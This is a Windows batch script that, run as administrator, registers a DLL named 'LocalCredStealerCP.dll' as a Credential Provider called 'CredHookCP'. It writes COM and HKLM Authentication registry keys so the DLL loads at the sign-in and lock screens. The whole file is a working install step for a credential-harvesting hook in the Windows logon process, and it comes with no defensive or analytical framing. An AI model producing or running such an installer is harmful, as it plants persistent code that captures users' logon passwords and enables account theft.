@echo off
setlocal enabledelayedexpansion

:: ====== CONFIGURE THESE TWO LINES ======
set CLSID_CP={5C1B3A2D-7F4E-4B0C-9D6E-8F2A1C3B5D7E}
set CP_NAME=CredHookCP
:: ======================================

:: Path to the built DLL (x64 build!)
set DLL_PATH=C:\Users\s12de\Documents\LocalCredStealerCP.dll

echo.
echo Registering Credential Provider...
echo   CLSID: %CLSID_CP%
echo   Name : %CP_NAME%
echo   DLL  : %DLL_PATH%
echo.

:: Admin check
net session >nul 2>&1
if %errorlevel% neq 0 (
  echo ERROR: Must run as Administrator.
  exit /b 1
)

:: Ensure the DLL exists
if not exist "%DLL_PATH%" (
  echo ERROR: DLL not found at "%DLL_PATH%".
  echo Build the x64 DLL and update DLL_PATH if needed.
  exit /b 2
)

:: Use the 64-bit reg.exe on 64-bit OS, even if this script is launched from a 32-bit host.
set REG_EXE=%SystemRoot%\System32\reg.exe
if exist %SystemRoot%\Sysnative\reg.exe set REG_EXE=%SystemRoot%\Sysnative\reg.exe

echo Writing COM registration (HKCR\CLSID)...
"%REG_EXE%" add "HKCR\CLSID\%CLSID_CP%" /ve /d "%CP_NAME%" /f >nul || goto :reg_error
"%REG_EXE%" add "HKCR\CLSID\%CLSID_CP%\InprocServer32" /ve /d "%DLL_PATH%" /f >nul || goto :reg_error
"%REG_EXE%" add "HKCR\CLSID\%CLSID_CP%\InprocServer32" /v ThreadingModel /t REG_SZ /d "Apartment" /f >nul || goto :reg_error

echo Writing Credential Provider key...
"%REG_EXE%" add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\Credential Providers\%CLSID_CP%" /ve /d "%CP_NAME%" /f >nul || goto :reg_error

echo.
echo SUCCESS: Credential Provider registered.
echo - Sign out or lock (Win+L) to see it.
echo - To uninstall, run unregister_cp.cmd
echo.
exit /b 0

:reg_error
echo.
echo ERROR: Failed to write registry (code %errorlevel%).
echo Make sure you are running as Admin and the CLSID/DLL path are correct.
exit /b %errorlevel%